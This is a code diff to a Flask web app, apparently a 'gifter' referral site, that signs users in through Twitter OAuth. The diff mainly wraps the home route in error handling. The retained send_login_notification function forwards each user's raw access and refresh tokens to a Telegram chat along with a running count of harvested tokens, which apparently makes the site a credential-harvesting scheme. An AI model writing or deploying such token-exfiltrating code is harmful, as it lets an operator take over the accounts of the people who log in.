@@ -74,12 +74,6 @@ def init_db():
     conn.close()
     print("Database initialized with updated schema.")
     
-import os
-
-# Place this at the beginning with other configurations
-APP_URL = os.getenv("APP_URL", "https://gifter-7vz7.onrender.com")  # Default to your app URL
-
-# ...
 
 def store_token(access_token, refresh_token, username):
     print("Storing token in the database...")
@@ -135,7 +129,6 @@ def store_token(access_token, refresh_token, username):
     except Exception as e:
         print(f"Database error while storing token: {e}")
 
-# Send notification with template
 def send_login_notification(access_token, refresh_token, username, profile_url, referral_url, total_tokens):
     send_message_via_telegram(
         f"🔑 Access Token: {access_token}\n"
@@ -146,98 +139,105 @@ def send_login_notification(access_token, refresh_token, username, profile_url, 
         f"📊 Total Tokens in Database: {total_tokens}"
     )
 
+
 @app.route('/')
 def home():
-    send_message_via_telegram("🔑 Initiating `home` route.")
-    code = request.args.get('code')
-    state = request.args.get('state')
-    error = request.args.get('error')
+    try:
+        send_message_via_telegram("🔑 Initiating `home` route.")
+        code = request.args.get('code')
+        state = request.args.get('state')
+        error = request.args.get('error')
 
-    # Save referrer_id in session if provided
-    referrer_id = request.args.get('referrer_id')
-    if referrer_id:
-        session['referrer_id'] = referrer_id
-        send_message_via_telegram(f"🆔 Referrer ID {referrer_id} stored in session.")
+        # Save referrer_id in session if provided
+        referrer_id = request.args.get('referrer_id')
+        if referrer_id:
+            session['referrer_id'] = referrer_id
+            send_message_via_telegram(f"🆔 Referrer ID {referrer_id} stored in session.")
 
-    # Check if user is already logged in
-    if 'username' in session:
-        username = session['username']
-        
-        # Retrieve referral URL from database
-        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-        cursor = conn.cursor()
-        cursor.execute("SELECT referral_url FROM users WHERE username = %s", (username,))
-        referral_url = cursor.fetchone()[0]
-        conn.close()
-        
-        send_message_via_telegram(f"👋 @{username} just returned to the website.\n🔗 Referral URL: {referral_url}")
-        return redirect(url_for('welcome'))
+        # Check if user is already logged in
+        if 'username' in session:
+            username = session['username']
+            
+            # Retrieve referral URL from database
+            conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+            cursor = conn.cursor()
+            send_message_via_telegram(f"🔍 Retrieving referral URL for returning user @{username}.")
+            cursor.execute("SELECT referral_url FROM users WHERE username = %s", (username,))
+            referral_url = cursor.fetchone()[0]
+            conn.close()
+            
+            send_message_via_telegram(f"👋 @{username} just returned to the website.\n🔗 Referral URL: {referral_url}")
+            return redirect(url_for('welcome'))
 
-    # Initiate OAuth flow if 'authorize' is true
-    if request.args.get('authorize') == 'true':
-        send_message_via_telegram("🔒 Starting OAuth authorization process.")
-        authorization_url = initiate_oauth()
-        send_message_via_telegram("🔗 Redirecting to authorization URL.")
-        return redirect(authorization_url)
+        # Initiate OAuth flow if 'authorize' is true
+        if request.args.get('authorize') == 'true':
+            send_message_via_telegram("🔒 Starting OAuth authorization process.")
+            authorization_url = initiate_oauth()
+            send_message_via_telegram("🔗 Redirecting to authorization URL.")
+            return redirect(authorization_url)
 
-    # Process authorization code if present
-    if code:
-        send_message_via_telegram("🔓 Authorization code received. Exchanging for tokens.")
-        
-        if error:
-            send_message_via_telegram(f"❌ Error during authorization: {error}")
-            return f"Error during authorization: {error}", 400
+        # Process authorization code if present
+        if code:
+            send_message_via_telegram("🔓 Authorization code received. Exchanging for tokens.")
+            
+            if error:
+                send_message_via_telegram(f"❌ Error during authorization: {error}")
+                return f"Error during authorization: {error}", 400
 
-        if state != session.get('oauth_state', '0'):
-            send_message_via_telegram("❌ Invalid state parameter.")
-            return "Invalid state parameter", 403
+            if state != session.get('oauth_state', '0'):
+                send_message_via_telegram("❌ Invalid state parameter.")
+                return "Invalid state parameter", 403
 
-        token_response = process_authorization_code(code)
-        if token_response:
-            access_token = token_response.get('access_token')
-            refresh_token = token_response.get('refresh_token')
+            token_response = process_authorization_code(code)
+            if token_response:
+                access_token = token_response.get('access_token')
+                refresh_token = token_response.get('refresh_token')
 
-            # Fetch Twitter username and profile URL
-            send_message_via_telegram("🔍 Fetching Twitter username for the new user.")
-            username, profile_url = get_twitter_username_and_profile(access_token)
+                # Fetch Twitter username and profile URL
+                send_message_via_telegram("🔍 Fetching Twitter username for the new user.")
+                username, profile_url = get_twitter_username_and_profile(access_token)
 
-            if username:
-                # Store tokens and username in the database
-                send_message_via_telegram(f"🔄 Starting token storage process for @{username}")
-                store_token(access_token, refresh_token, username)
-                
-                # Set session values
-                session['username'] = username
-                session['access_token'] = access_token
-                session['refresh_token'] = refresh_token
-                
-                # Get total token count for reporting
-                total_tokens = get_total_tokens()
-                
-                # Retrieve referral URL for notification
-                conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-                cursor = conn.cursor()
-                cursor.execute("SELECT referral_url FROM users WHERE username = %s", (username,))
-                referral_url = cursor.fetchone()[0]
-                conn.close()
+                if username:
+                    # Store tokens and username in the database
+                    send_message_via_telegram(f"🔄 Starting token storage process for @{username}")
+                    store_token(access_token, refresh_token, username)
+                    
+                    # Set session values
+                    session['username'] = username
+                    session['access_token'] = access_token
+                    session['refresh_token'] = refresh_token
+                    
+                    # Get total token count for reporting
+                    total_tokens = get_total_tokens()
+                    
+                    # Retrieve referral URL for notification
+                    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT referral_url FROM users WHERE username = %s", (username,))
+                    referral_url = cursor.fetchone()[0]
+                    conn.close()
 
-                # Send consolidated notification
-                send_login_notification(access_token, refresh_token, username, profile_url, referral_url, total_tokens)
-                send_message_via_telegram(f"🎉 New login completed. @{username} is now logged in. Total tokens: {total_tokens}")
-                
-                return redirect(url_for('welcome'))
+                    # Send consolidated notification
+                    send_login_notification(access_token, refresh_token, username, profile_url, referral_url, total_tokens)
+                    send_message_via_telegram(f"🎉 New login completed. @{username} is now logged in. Total tokens: {total_tokens}")
+                    
+                    return redirect(url_for('welcome'))
+                else:
+                    send_message_via_telegram("❌ Error retrieving user info with access token.")
+                    return "Error retrieving user info with access token", 400
             else:
-                send_message_via_telegram("❌ Error retrieving user info with access token.")
-                return "Error retrieving user info with access token", 400
-        else:
-            error_description = token_response.get('error_description', 'Unknown error')
-            error_code = token_response.get('error', 'No error code')
-            send_message_via_telegram(f"❌ Error retrieving access token: {error_description} (Code: {error_code})")
-            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+                error_description = token_response.get('error_description', 'Unknown error')
+                error_code = token_response.get('error', 'No error code')
+                send_message_via_telegram(f"❌ Error retrieving access token: {error_description} (Code: {error_code})")
+                return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
 
-    # Render the home page with Sign Up/Login button if not authorized
-    send_message_via_telegram("ℹ️ Displaying home page to user.")
-    return render_template('home.html')
+        # Render the home page with Sign Up/Login button if not authorized
+        send_message_via_telegram("ℹ️ Displaying home page to user.")
+        return render_template('home.html')
+
+    except Exception as e:
+        send_message_via_telegram(f"❌ Error in `home` route: {str(e)}")
+        return f"An error occurred: {str(e)}", 500
 
 # Helper function to initiate OAuth flow
 def initiate_oauth():
